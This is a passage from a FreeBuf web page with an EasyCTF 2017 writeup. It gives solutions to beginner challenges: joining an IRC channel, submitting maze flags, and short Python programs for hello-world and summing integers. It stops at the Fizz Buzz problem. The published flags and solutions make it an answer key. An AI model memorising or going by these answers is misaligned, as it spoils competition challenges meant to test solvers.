<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!--
                              _.._        ,------------.
                           ,'      `.    ( We want you! )
                          /  __) __` \    `-,----------'
                         (  (`-`(-')  ) _.-'
                         /)  \  = /  (
                        /'    |--' .  \
                       (  ,---|  `-.)__`
                        )(  `-.,--'   _`-.
                       '/,'          (  Uu",
                        (_       ,    `/,-' )
                        `.__,  : `-'/  /`--'
                          |     `--'  |
                          `   `-._   /
                           \        (
                           /\ .      \.  freebuf
                          / |` \     ,-\
                         /  \| .)   /   \
                        ( ,'|\    ,'     :
                        | \,`.`--"/      }
                        `,'    \  |,'    /
                       / "-._   `-/      |
                       "-.   "-.,'|     ;
                      /        _/["---'""]
                     :        /  |"-     '
                     '           |      /
                                 `      |
-->
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>
  EasyCTF 2017 Writeup - FreeBuf.COM | 关注黑客与极客</title>
<meta name="description" content="0&#215;00 Miscellaneous
IRC
problem
EasyCTF has an IRC channel! Check out #easyctf2017 on freenode to claim a free flag, and stick around to get on-the-fly updates during the competition.
solution
…" />
<meta name="keywords" content="EazyCTF, Writeup, 其他, 新手科普" />
<meta name="baidu-site-verification" content="nKKKqQxp6R" />
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="renderer" content="webkit">
<meta property="qc:admins" content="6620477777662552566375" />
<link rel='stylesheet' id='wpfp-css' href='http://www.freebuf.com/buf/plugins/wp-favorite-posts/wpfp.css' type='text/css' />
<link rel='stylesheet' id='wp-recentcomments-css'  href='http://static.3001.net/css/recentcomments/wp-recentcomments.css?ver=2.2.3' type='text/css' media='screen' />
<link rel='stylesheet' id='mycred-widget-css'  href='http://www.freebuf.com/buf/plugins/gold/assets/css/widget.css?ver=1.3.2.1' type='text/css' media='all' />
<script type='text/javascript' src='http://static.3001.net/js/header/jquery.min.js?ver=3.6.1'></script>
<script type='text/javascript' src='http://www.freebuf.com/buf/plugins/wp-favorite-posts/wpfp.js?ver=3.6.1'></script>
<link rel='prev' title='近期正热的Word 0day漏洞已经被用于恶意软件散播和国家攻击' href='http://www.freebuf.com/news/131918.html' />
<link rel='next' title='Longhorn黑客组织就来自中情局：CIA已经针对16个国家发起过攻击' href='http://www.freebuf.com/articles/network/131741.html' />
<link rel='canonical' href='http://www.freebuf.com/articles/others-articles/131073.html' />
<link rel='shortlink' href='http://www.freebuf.com/?p=131073' />

<link rel="stylesheet" href="http://static.3001.net/css/highslide/highslide.css" type="text/css" />
<script type="text/javascript" src="http://static.3001.net/js/highslide/highslide-with-html.packed.js"></script>
<script type="text/javascript">
jQuery(document).ready(function($) {
    hs.graphicsDir = "http://www.freebuf.com/buf/plugins/auto-highslide/images/graphics/";
    hs.outlineType = "rounded-white";
    hs.dimmingOpacity = 0.8;
    hs.outlineWhileAnimating = true;
    hs.showCredits = false;
    hs.captionEval = "this.thumb.alt";
    hs.numberPosition = "caption";
    hs.align = "center";
    hs.transitions = ["expand", "crossfade"];
    hs.addSlideshow({
        interval: 5000,
        repeat: true,
        useControls: true,
        fixedControls: "fit",
        overlayOptions: {
            opacity: 0.75,
            position: "bottom center",
            hideOnMouseOut: true

        }

    });
});
</script>
          <script language="JavaScript" type="text/javascript" src="http://www.freebuf.com/buf/plugins/cartpauj-pm/js/script.js"></script>
      <link rel="stylesheet" type="text/css" href="http://www.freebuf.com/buf/plugins/cartpauj-pm/style/style.css" />
      <script type="text/javascript" src="http://www.freebuf.com/buf/plugins/simditor/highlight/highlight.pack.js"></script><link type="text/css" rel="stylesheet" href=" http://www.freebuf.com/buf/plugins/simditor/highlight/styles/default.css" />	<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
<link rel="shortcut icon" href="http://static.freebuf.com/images/favicon.ico" />
<link rel="stylesheet" href="http://static.3001.net/css/new/header.css" />
<link href="http://static.3001.net/css/new/bootstrap.min.css?ver=2016051701" rel="stylesheet" media="screen">
    <!--轮播图-->
    <link href="http://static.3001.net/css/new/swiper-3.4.2.min.css" rel="stylesheet" type="text/css">
    <link href="http://static.3001.net/css/new/style.css?ver=20170912568" rel="stylesheet" type="text/css">
    <style type="text/css">
#contenttxt hr {
  display: block;
  height: 0px;
  border: 0;
  border-top: 1px solid #ccc;
  margin: 15px 0;
  padding: 0;
}
#contenttxt table {
  width: 100%;
  table-layout: fixed;
  border-collapse: collapse;
  border-spacing: 0;
  margin: 15px 0;
}
#contenttxt table thead {
  background-color: #f9f9f9;
}
#contenttxt table td, #contenttxt table th {
  min-width: 40px;
  height: 30px;
  border: 1px solid #ccc;
  vertical-align: top;
  padding: 2px 4px;
  text-align: left;
  box-sizing: border-box;
  white-space: pre-wrap; white-space: -moz-pre-wrap; white-space: -pre-wrap; white-space: -o-pre-wrap; word-wrap: break-word;
}
#contenttxt table td.active, #contenttxt table th.active {
  background-color: #ffffee;
  white-space: pre-wrap; white-space: -moz-pre-wrap; white-space: -pre-wrap; white-space: -o-pre-wrap; word-wrap: break-word;
}
</style>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/jquery-2.0.3.min.js"></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/bootstrap.min.js"></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/slider.js?2016022501.1" type="text/javascript"></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/jquery.sticky.js" type="text/javascript"></script>
<script src="http://static.3001.net/js/focus/bjqs-1.3.min.js" type="text/javascript" ></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/mosaic.1.0.1.min.js" type="text/javascript" ></script>
<script type="text/javascript" src="http://static.3001.net/js/new/setint.js"></script>
    <!--轮播图-->
    <script src="http://static.3001.net/js/colum/swiper-3.4.2.min.js"></script>
<!--[if lt IE 9]>
    <script src="http://www.freebuf.com/buf/themes/freebuf/js/html5shiv.min.js"></script>
    <script src="http://www.freebuf.com/buf/themes/freebuf/js/respond.min.js"></script>
<![endif]-->
    <style>
        @font-face {font-family: 'iconfont';
            src: url('http://static.3001.net/iconfont/iconfont.eot'); /* IE9*/
            src: url('http://static.3001.net/iconfont/iconfont.eot?#iefix') format('embedded-opentype'), /* IE6-IE8 */
            url('http://static.3001.net/iconfont/iconfont.woff') format('woff'), /* chrome、firefox */
            url('http://static.3001.net/iconfont/iconfonticonfont.ttf') format('truetype'), /* chrome、firefox、opera、Safari, Android, iOS 4.2+*/
            url('http://static.3001.net/iconfont/iconfont.svg#iconfont') format('svg'); /* iOS 4.1- */
        }
    </style>
</head>

<body>
<!----------header---------->
<!--头部导航-->
<div id="undefined-sticky-wrapper" class="sticky-wrapper is-sticky">
    <div class="main-header">
        <div class="header">
            <div class="header-container clearfix">
                                <div class="header-logo"><a href="http://www.freebuf.com"></a></div>
                                        <!-- column -->
                        <div class="nav">
                            <ul class="nav-child clearfix">
                                <li class=" index">
                                    <a href="http://www.freebuf.com">首页</a></li>
                                <li data-value="read-menu">
                                    <a href="#">分类阅读<b class="triangle-down triangle-down-04"></b></a>
                                </li>
                                <li data-value="wenku-menu"><a href="javascript:;" target="_blank">文库<b class="triangle-down triangle-down-04"></b></a></li>
                                <li>
                                    <a href="http://zhuanlan.freebuf.com" target="_blank">专栏</a><b class="icon-betr"></b>
                                </li>
                                <li><a href="http://open.freebuf.com" target="_blank">公开课</a></li>
                                <li><a href="http://shop.freebuf.com" target="_blank">商城</a></li>
                                <li data-value="company-menu"><a href="javascript:;" >企业服务<b class="triangle-down triangle-down-04"></b></a></li>
                                <li data-value="user-menu"><a href="javascript:;" >用户服务<b class="triangle-down triangle-down-04"></b></a></li>
                            </ul>
                        </div>
                                        <div class="header-right">
                                    <div class="loginSign login-before">
                        <a href="https://account.tophant.com/register.html" class="login-btn">注册</a>
                        |
                        <a href="http://www.freebuf.com/oauth" class="sign-btn">登录</a>
                    </div>
                                    <!--搜索-->
                    <div class="search-form-inner clearfix">
                        <i class="searchdisplayico"></i>
                        <div class="form-group has-active search-col search-form-text">
                            <form id="hpsform-new" class="navbar-search navbar-form" onsubmit="return dispatch();">
                                <div class="form-group">
                                    <input id="bigq" class="input form-control" type="text" placeholder="关键字查找" autocomplete="off" title="关键字查找" name="q">
                                    <button class="submit" type="submit"></button>
                                </div>
                            </form>
                        </div>
                    </div>
                    <!--<script>
                        $('.search-form-inner .searchdisplayico').click(function(event) {
                            var evt = evt || event;
                            evt.stopPropagation();
                            $(this).siblings('.search-col').addClass('active');
                        });
                        $('.search-form-inner .search-col').click(function(event) {
                            var evt = evt || event;
                            evt.stopPropagation();
                            $('.search-form-inner .search-col').addClass('active');
                        });
                        $(document).click(function() {
                            $('.search-form-inner .search-col').removeClass('active');
                        });
                    </script>-->
                                    <div class="btn-publish">
                        <a href="#">投稿</a>
                        <div class="btn-publish-child">
                            <ul class="btn-child clearfix">
                                <li><a href="http://my.freebuf.com/post/edit/" target="_blank">文章撰写</a></li>
                                <li><hr/></li>
                                <li><a href="http://my.freebuf.com/post/article/" target="_blank">投稿管理</a></li>
                                                        </ul>
                        </div>
                    </div>
                </div>
                <div class="nav-small">
                    <a href="#">&#xe634;</a>
                    <ul class="nav-child clearfix">
                                                        <li class=" index">
                                    <a href="http://www.freebuf.com">首页</a></li>
                                <li class="read-classify">
                                    <a href="#">分类阅读<b class="icon-arrow"></b></a>
                                    <ul class="nav-child2 read-classify clearfix">
                                        <li>
                                            <strong>黑客</strong>
                                            <div class="nav-item">
                                                <a href="http://www.freebuf.com/vuls" target="_blank">漏洞</a>
                                                <a href="http://www.freebuf.com/sectool" target="_blank">安全工具</a>
                                                <a href="http://www.freebuf.com/articles/web" target="_blank">WEB安全</a>
                                                <a href="http://www.freebuf.com/articles/system" target="_blank">系统安全</a>
                                                <a href="http://www.freebuf.com/articles/network" target="_blank">网络安全</a>
                                                <a href="http://www.freebuf.com/articles/wireless" target="_blank">无线安全</a>
                                                <a href="http://www.freebuf.com/articles/terminal" target="_blank">设备/客户端安全</a>
                                                <a href="http://www.freebuf.com/articles/database" target="_blank">数据库安全</a>
                                                <a href="http://www.freebuf.com/articles/security-management" target="_blank">安全管理</a>
                                                <a href="http://www.freebuf.com/articles/es" target="_blank">企业安全</a>
                                                <a href="http://www.freebuf.com/ics-articles" target="_blank">工控安全</a>
                                            </div>
                                        </li>
                                        <li>
                                            <strong>极客</strong>
                                            <div class="nav-item">
                                                <a href="http://www.freebuf.com/geek" target="_blank">极客有意思</a>
                                                <a href="http://www.freebuf.com/news/others" target="_blank">周边</a>
                                            </div>
                                        </li>
                                        <li>
                                            <strong>特色</strong>
                                            <div class="nav-item">
                                                <a href="http://www.freebuf.com/news/special" target="_blank">头条</a>
                                                <a href="http://www.freebuf.com/articles/people" target="_blank">人物志</a>
                                                <a href="http://www.freebuf.com/fevents" target="_blank">活动</a>
                                                <a href="http://www.freebuf.com/video" target="_blank">视频</a>
                                                <a href="http://www.freebuf.com/articles/neopoints" target="_blank">观点</a>
                                                <a href="http://www.freebuf.com/jobs" target="_blank">招聘</a>
                                                <a href="http://www.freebuf.com/paper/" target="_blank">报告</a>
                                            </div>
                                        </li>
                                    </ul>
                                </li>
                                <li><a href="http://zhuanlan.freebuf.com/" target="_blank">专栏</a></li>
                                <li><a href="http://open.freebuf.com" target="_blank">公开课</a></li>
                                <li><a href="http://shop.freebuf.com" target="_blank">商城</a></li>
                                <li>
                                    <a href="javascript:;" target="_blank">企业服务<b class="icon-arrow"></b></a>
                                    <ul class="nav-child2">
                                        <li>
                                            <a href="https://www.vulbox.com/bounties/item-9-0-1" target="_blank"><strong>企业SRC</strong></a>
                                        </li>
                                        <li>
                                            <a href="http://company.freebuf.com" target="_blank"><strong>企业空间</strong></a>
                                        </li>
                                        <li>
                                            <a href="https://www.vulbox.com/" target="_blank"><strong>安全测试</strong></a>
                                        </li>
                                        <li>
                                            <a href="https://www.riskivy.com/" target="_blank"><strong>风险感知</strong></a>
                                        </li>

                                    </ul>
                                </li>
                                <li>
                                    <a href="javascript:;" target="_blank">用户服务<b class="icon-arrow"></b></a>
                                    <ul class="nav-child2">
                                        <li>
                                            <a href="http://www.freebuf.com/newsend" target="_blank"><strong>有奖投稿</strong></a>
                                        </li>
                                        <li>
                                            <a href="http://zhuanlan.freebuf.com" target="_blank">
                                        </li>
                                        <li>
                                            <a href="https://www.vulbox.com/bounties/detail-72" target="_blank"><strong>提交漏洞</strong></a>
                                        </li>
                                        <li class="last">
                                            <a href="https://www.vulbox.com/bounties" target="_blank"><strong>参与众测</strong></a>
                                        </li>
                                    </ul>
                                </li>
                                <li>
                                    <a href="javascript:;" target="_blank">文库<b class="icon-arrow"></b></a>
                                    <ul class="nav-child2">
                                        <li>
                                            <a href="http://www.freebuf.com/wenku" target="_blank"><strong>文库</strong></a>
                                        </li>
                                        <li>
                                            <a href="http://www.freebuf.com/special-subject" target="_blank"><strong>专题</strong></a>
                                        </li>
                                    </ul>
                                </li>
                                                    <li><a href="http://my.freebuf.com/post/edit" target="_blank">投稿</a></li>
                                                    <li><a href="https://account.tophant.com/register.html" class="login-btn">注册</a>
                            </li>
                            <li><a href="http://www.freebuf.com/oauth" class="sign-btn">登录</a></li>
                                            </ul>
                </div>
            </div>
            <div class="dropdown-menu read-menu" id="read-menu">
                <div class="container">
                    <ul class="menu clearfix">
                        <li>
                            <strong>黑客</strong>
                            <div class="nav-item">
                                <a href="http://www.freebuf.com/vuls" target="_blank">漏洞</a>
                                <a href="http://www.freebuf.com/sectool" target="_blank">安全工具</a>
                                <a href="http://www.freebuf.com/articles/web" target="_blank">WEB安全</a>
                                <a href="http://www.freebuf.com/articles/system" target="_blank">系统安全</a>
                                <a href="http://www.freebuf.com/articles/network" target="_blank">网络安全</a>
                                <a href="http://www.freebuf.com/articles/wireless" target="_blank">无线安全</a>
                                <a href="http://www.freebuf.com/articles/terminal" target="_blank">设备/客户端安全</a>
                                <a href="http://www.freebuf.com/articles/database" target="_blank">数据库安全</a>
                                <a href="http://www.freebuf.com/articles/security-management" target="_blank">安全管理</a>
                                <a href="http://www.freebuf.com/articles/es" target="_blank">企业安全</a>
                                <a class="last" href="http://www.freebuf.com/ics-articles" target="_blank">工控安全</a>
                            </div>
                        </li>
                        <li>
                            <strong>极客</strong>
                            <div class="nav-item">
                                <a href="http://www.freebuf.com/geek" target="_blank">极客有意思</a>
                                <a class="last" href="http://www.freebuf.com/news/others" target="_blank">周边</a>
                            </div>
                        </li>
                        <li>
                            <strong>特色</strong>
                            <div class="nav-item">
                                <a href="http://www.freebuf.com/news/special" target="_blank">头条</a>
                                <a href="http://www.freebuf.com/articles/people" target="_blank">人物志</a>
                                <a href="http://www.freebuf.com/fevents" target="_blank">活动</a>
                                <a href="http://www.freebuf.com/video" target="_blank">视频</a>
                                <a href="http://www.freebuf.com/articles/neopoints" target="_blank">观点</a>
                                <a href="http://www.freebuf.com/jobs" target="_blank">招聘</a>
                                <a class="last" href="http://www.freebuf.com/paper/" target="_blank">报告</a>
                            </div>
                        </li>
                    </ul>
                </div>
            </div>
            <div class="dropdown-menu company-menu" id="company-menu">
                <div class="container">
                    <ul class="menu">
                        <li>
                            <a href="https://www.vulbox.com/bounties/item-9-0-1" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-src.png"></span>
                                <span class="name">企业SRC</span>
                                <span class="intro">全/半托管式互联网漏洞收集管理</span>
                            </a>
                        </li>
                        <li>
                            <a href="http://company.freebuf.com" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-company.png"></span>
                                <span class="name">企业空间</span>
                                <span class="intro">为企业定制信息安全专属门户</span>
                            </a>
                        </li>
                        <li>
                            <a href="https://www.vulbox.com/" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-safety.png"></span>
                                <span class="name">安全测试</span>
                                <span class="intro">国内领先的互联网安全众测服务</span>
                            </a>
                        </li>
                        <li class="last">
                            <a href="https://www.riskivy.com/" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-risk.png"></span>
                                <span class="name">风险感知</span>
                                <span class="intro">基于IT资产的自动化安全监控</span>
                            </a>
                        </li>

                    </ul>
                </div>
            </div>
            <div class="dropdown-menu user-menu" id="user-menu">
                <div class="container">
                    <ul class="menu">
                        <li>
                            <a href="http://www.freebuf.com/newsend" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-write.png"></span>
                                <span class="name">有奖投稿</span>
                                <span class="intro">与整个行业分享你的经验与见解</span>
                            </a>
                        </li>
                        <li>
                            <a href="http://zhuanlan.freebuf.com" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-column.png"></span>
                                <span class="name">申请专栏</span>
                                <span class="intro">自由创作，打造自主内容品牌</span>
                            </a>
                        </li>
                        <li>
                            <a href="https://www.vulbox.com/bounties/detail-72" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-leak.png"></span>
                                <span class="name">提交漏洞</span>
                                <span class="intro">与数万白帽一起，让互联网更安全</span>
                            </a>
                        </li>
                        <li class="last">
                            <a href="https://www.vulbox.com/bounties" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-test.png"></span>
                                <span class="name">参与众测</span>
                                <span class="intro">挖洞开启自由职业之路</span>
                            </a>
                        </li>
                    </ul>
                </div>
            </div>
            <div class="dropdown-menu wenku-menu" id="wenku-menu">
                <div class="container">
                    <ul class="menu">
                        <li>
                            <a href="http://www.freebuf.com/wenku" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-write.png"></span>
                                <span class="name">文库</span>
                                <span class="intro">最全的FB百科</span>
                            </a>
                        </li>
                        <li class="last">
                            <a href="http://www.freebuf.com/special-subject" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-test.png"></span>
                                <span class="name">专题</span>
                                <span class="intro">浓缩的安全精华汇总</span>
                            </a>
                        </li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
</div>
<!----------header end---------->
<!--<script type="application/javascript">
    var  _value_tab = '';
    $(function(){
        var _that = '', _show_flag = 0;
        $('.header .header-container .nav .nav-child > li:not(input[data-value])').mouseover(function() {
            $('.header .dropdown-menu').stop().slideUp(50);
        });
        $('.header').mouseout(function() {
            $('.header .dropdown-menu').stop().slideUp(50);
        });
        /*$('.header .header-container .nav .nav-child > li').mouseover(function() {
         _value_tab = $(this).attr('data-value');
         $('#'+_value_tab).siblings('.dropdown-menu').stop().slideUp(50);
         $('#'+_value_tab).stop().slideDown(100);
         });*/
        $(".header .header-container .nav .nav-child > li").hoverDelay({
            hoverDuring: 500,
            hoverEvent: function(){
                $('#'+_value_tab).siblings('.dropdown-menu').stop().slideUp(50);
                $('#'+_value_tab).stop().slideDown(100);
            }
        });
        $('.header .dropdown-menu').mouseover(function() {
            _value_tab = $(this).attr('id');
            _that = this;
            $('.nav-child li[data-value="'+_value_tab+'"]').addClass('hover');
            $(this).stop().slideDown(50);
        }).mouseout(function() {
            $('.nav-child li[data-value="'+_value_tab+'"]').removeClass('hover');
            $(_that).stop().slideUp(50);
        });

        $(".nav-small .nav-child > li").click(function(event){
            var ev = ev || event;
            ev.stopPropagation();

            if($(this).find('.nav-child2').is(":hidden")) {
                _show_flag = 1;
                $(this).find('.nav-child2').slideDown();
                $(this).find('.icon-arrow').addClass('bottom');
            }else {
                _show_flag = 0;
                $(this).find('.nav-child2').slideUp();
                $(this).find('.icon-arrow').removeClass('bottom');
            }
            $(this).siblings().find('.nav-child2').slideUp();
            $(this).siblings().find('.icon-arrow').removeClass('bottom');
        });
        //头部投稿按钮hover状态展开菜单
        $(".btn-publish-child > ul > li").hover(function(){
            $(this).addClass("active");
            $(this).siblings().removeClass("active");
        });

        $(document).click(function(event){
            var ev = ev || event;
            $(".login-after").find(".login-after-child").hide();
        });
        //点击用户信息，出现下拉菜单
        $("#user-info").click(function(event){
            var ev = ev || event;
            ev.stopPropagation();
            $(".login-after").find(".login-after-child").toggle();
        });
        //顶部导航
        $(".nav-small").click(function(){
            $(this).find(".nav-child").slideToggle();
        });
        var that = '';
        $('.header .header-container .nav .nav-child > li').mouseover(function() {
            that = this;
            $(this).find('.dropdown-menu').stop().slideDown(200);
        }).mouseout(function() {
            $(that).find('.dropdown-menu').stop().slideUp(200);
        });
    });
    $(".nav-small .nav-child > li").click(function(event){
        var ev = ev || event;
        ev.stopPropagation();
        $(this).siblings('li').find('.dropdown-menu').hide();
        $(this).find(".dropdown-menu").toggle();
    });
    //鼠标经过(hover)事件的延时处理
    (function($){
        $.fn.hoverDelay = function(options){
            var defaults = {
                hoverDuring: 100,
                outDuring: 100,
                hoverEvent: function(){
                    $.noop();
                },
                outEvent: function(){
                    $.noop();
                }
            };
            var sets = $.extend(defaults,options || {});
            var hoverTimer, outTimer;
            return $(this).each(function(){
                $(this).hover(function(){
                    _value_tab = $(this).attr('data-value');
                    clearTimeout(outTimer);
                    hoverTimer = setTimeout(sets.hoverEvent, sets.hoverDuring);
                },function(){
                    clearTimeout(hoverTimer);
                    outTimer = setTimeout(sets.outEvent, sets.outDuring);
                });
            });
        }
    })(jQuery);
</script>-->
<script type="text/javascript" src="http://static.3001.net/js/header/header.js"></script><script>
    jQuery(window).load(function(){
      if(jQuery(window).width()>480){
        jQuery(".main-header").sticky({ topSpacing: 0 });
      }else{
        jQuery(".main-header nav").removeClass("navbar-fixed-top");
      }
      jQuery("#mar-right").sticky({ topSpacing: 105,bottomSpacing: 410 });
    });
</script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/layer.js"></script>
<script type="text/javascript" src="http://static.3001.net/js/pretty/prettify.js"></script>
<script type="text/javascript" src="http://static.3001.net/js/header/lazyload.js"></script>
<script type="text/javascript" charset="utf-8">
      jQuery(function() {
          jQuery("img").lazyload({
              effect : "fadeIn"
          });
      });
 </script>
<script type="text/javascript">
    window.onload = function(){
        prettyPrint();
    }
</script>
<script language="JavaScript" type="text/javascript">
//<![CDATA[
var va = "您已经点亮过了";
function acv_vote(id,option, m){
  if( m==null) m =''; m = m + '';
  jQuery('#acv_stat_'+m+id).html('Loading...');
  var url="http://www.freebuf.com/index.php?acv_ajax=true&option="+option+"&ID="+id;
  jQuery.get(url,function(d){
    d =d.split('|');var s='#acv_stat_'+m+d[0];
    var sele = '#cos_support-'+m+id,unsele = '#cos_unsupport-'+m+id,tpjs = 'javascript:alert(va)';
    jQuery( s ).html( d[1] );jQuery(s).fadeOut(400,function(){jQuery(s).fadeIn();});
    if( d[2] == 1 ){ jQuery(sele).html(jQuery(sele).html()*1+1); }
    if( d[2] == -1 ){ jQuery(unsele).html(jQuery(unsele).html()*1+1); }
    jQuery('#vote4-'+id).attr('href',tpjs);jQuery('#vote4-2'+id).attr('href',tpjs);
    jQuery('#votea-'+id).attr('href',tpjs);jQuery('#votea-2'+id).attr('href',tpjs);
  });
}
  
$(document).on("mouseenter",".comment-tools",function(){
  $(this).find(".btn-report").show();
  $(this).find(".btn-report").addClass("hover");
}).on("mouseleave",".comment-tools",function(){
  var $_this = $(this);
  $(this).find(".btn-report").removeClass("hover");
  if(!$(this).find(".dropup").hasClass('open')){
    $(this).find(".btn-report").hide(); 
    $_this.find(".dropdown-menu").css("display","none");
  }else{
    setTimeout(function(){
      if(!$_this.find(".btn-report").hasClass("hover")){
        $_this.find(".dropup").removeClass("open");
        $_this.find(".dropdown-menu").css("display","none");
        $_this.find(".btn-report").hide(); 
      }
    },"500");
  }
})

$(document).on("click",".click_report",function(){
  $(this).parent().parent().css("display","none");
  var id = $(this).attr("data-id");
  var url="http://www.freebuf.com/index.php?acv_ajax=true&option=0&ID="+id;
  $_this = $(this);
  jQuery.get(url,function(d){
    d =d.split('|');
    if(d[1]=='您已经点过灯了'){
      d[1] = '您已经举报过了';
    }
    if(d[1]=='Thank you'){
      d[1] = '举报成功';
    }
    $_this.parent().parent().parent().find(".btn-report").text(d[1]);
    $_this.parent().parent().parent().find(".btn-report").css("display","block");
  })
})

$(document).on("click",".btn-report",function(){
  if($(this).parent().hasClass('open')){
    $(this).parent().find(".dropdown-menu").css("display","block");
  }else{
    $(this).parent().find(".dropdown-menu").css("display","none");
  }
})
//]]>
</script>
<div class="column-article" data-column="">
            <div class="container pad-top35">
        <div class="row clearfix">
            <div class="col-md-9" id="getWidth">
                                    <div class="reletive search-xs-wrap">
                    <div class="form-group has-active search-col search-xs">
                        <form id="hpsform-new" class="navbar-search navbar-form" onsubmit="return dispatch()">
                            <div class="form-group">
                                <input id="q" class="input form-control" type="text" placeholder="关键字查找" autocomplete="off" title="关键字查找" name="q">
                                <button class="submit" type="submit"></button>
                            </div>
                        </form>
                    </div>
                </div>
                    <script type="text/javascript">
                        var dispatch = function () {
                            console.log(123)
                            var q = document.getElementById("q");
                            if (q.value == "") {
                                q = document.getElementById("bigq");
                            }
                            if (q.value != "") {
                                window.open('http://www.freebuf.com/?s=' + q.value, "_blank");
                                return false;
                            } else {
                                return false;
                            }
                        }
                    </script>
                                <div class="article-wrap panel panel-default">
                                                            <div class="articlecontent">
                                                    <div class="title">
                                <h2>
                                    EasyCTF 2017 Writeup                                </h2>
                                <div class="property">
                                                                            <span class="name"><a href="http://www.freebuf.com/author/%e7%b2%be%e7%81%b5" title="由 精灵 发布" rel="author">精灵</a></span>
                                                                        <span class="icon-f"></span>
                                    <span class="time">2017-04-15</span>
                                                                                                                    <img style="float: left;margin-top:2px;" title="金币奖励" src="http://image.3001.net/images/other/gold.png"/>
                                        <span class="coin"><strong>+20</strong></span>
                                                                                                            <span class="look">共<strong>169436</strong>人围观
                                        ，发现 <strong>7</strong> 个不明物体 </span>                                      </span>
                                                                <span class="tags">
                                      <a href="http://www.freebuf.com/./articles/others-articles">其他</a><a href="http://www.freebuf.com/./articles/rookie">新手科普</a></span>
                                    <span class="tags_01"></span>
                                </div>
                            </div>
                                                                                                <div id="contenttxt">
                            <h1 style="text-align: center;"><strong><img alt="TIM截图20170329165128.png" data-original="http://image.3001.net/images/20170329/14907775375364.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="690" height="400"><br /></strong></h1>
<noscript><img alt="TIM截图20170329165128.png" src="http://image.3001.net/images/20170329/14907775375364.png!small" width="690" height="400"><br /></strong></h1></noscript>
<h2>0&#215;00 Miscellaneous</h2>
<h3>IRC</h3>
<p><b>problem</b></p>
<p>EasyCTF has an IRC channel! Check out #easyctf2017 on freenode to claim a free flag, and stick around to get on-the-fly updates during the competition.</p>
<p><b>solution</b></p>
<p>了解一波IRC熟悉一下操作命令找到</p>
</p>
<pre><code>Cannot join channel (+r) - you need to be identified with services&nbsp;</code></pre>
</p>
<p>的<a href="https://superuser.com/questions/106965/how-do-i-identify-with-services-on-irc" target="_blank">解决方法</a>成功加入到#easyctf2017的频道。</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907753846855.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907753846855.png!small" alt=""></p></noscript>
<h3>A-maze-ing</h3>
<p><b>problem</b></p>
<p>Solve a maze! &#8216;j&#8217; is left, &#8216;k&#8217; is down, &#8216;l&#8217; is right, and &#8216;i&#8217; is up. You input directions in a string. An example: &#8220;jkliilillikjk&#8221;. Submit your input string as the flag. (Whoops! You don&#8217;t have a maze, do you? Sucks to be you.</p>
<p><b>solution</b></p>
</p>
<pre><code><p>easyctf{jjjjjjjjjjjjjjjjjjj}</p><p>easyctf{kkkkkkkkkkkkkkkkkkk}</p></code></pre>
</p>
<p>参考<a href="https://www.zhihu.com/question/25539346" target="_blank">一个迷宫从入口进去沿着右手边的墙走是否肯定能走到出口</a></p>
<h2>0&#215;01 Programming</h2>
<h3>Hello, world!</h3>
<p><b>problem</b></p>
<p>Use your favorite programming language to print Hello, world! to stdout! Use the programming interface to do this!</p>
<p>Programming Judge codes:</p>
</p>
<pre><code><p>AC: accepted</p><p>WA: WRONG ANSWER (you're bad)</p><p>TLE: time limit exceeded (make your code faster)</p><p>RTE: runtime error</p><p>JE: judge error (contact an admin if you encounter this)</p><p>CE: compilation error</p></code></pre>
</p>
<p><b>solution</b></p>
</p>
<pre><code>print('Hello, world!')</code></pre>
</p>
<h3>Things Add Up</h3>
<p><b>problem</b></p>
<p>For this problem you will utilise the programming interface, which you can access via the navigation bar at the top of your screen.</p>
<p>The input for your program will be given via STDIN &#8211; that&#8217;s cin, input(), and System.in for cxx, Python, and Java respectively. Output goes to STDOUT &#8211; cout, print, and System.out. Your program will be run on several sets of input, and if your output    matches ours for each testcase, this problem will be marked solved.</p>
<p>We&#8217;ll start with a simple challenge. Each testcase has two lines of input. The first will contain an integer N. The second will contain a sequence of integers a_1, a_2, &#8230;, a_N. You are to output the sum of that sequence &#8211; that is, a_1 + a_2 + &#8230; +    a_n. Good luck!</p>
<p>Input Constraints</p>
</p>
<pre><code><p>0 &lt; N &lt; 100</p><p>-1000 &lt; a_i &lt; 1000</p></code></pre>
</p>
<p>Sample Input</p>
</p>
<pre><code><p>5</p><p>2 4 7 3 1</p></code></pre>
</p>
<p>Sample Output</p>
</p>
<pre><code>17</code></pre>
</p>
<p><b>solution</b></p>
</p>
<pre><code><p>n = input()</p><p>s = raw_input().split()</p><p>r = 0</p><p>for x in xrange(n):</p><p>&nbsp; &nbsp; r += int(s[x])</p><p>print(r)</p></code></pre>
</p>
<h3>Fizz Buzz 1</h3>
<p><b>problem</b></p>
<p>Write a program that takes an integer n as input.</p>
<p>Output the numbers 1 through n, in increasing order, one per line.</p>
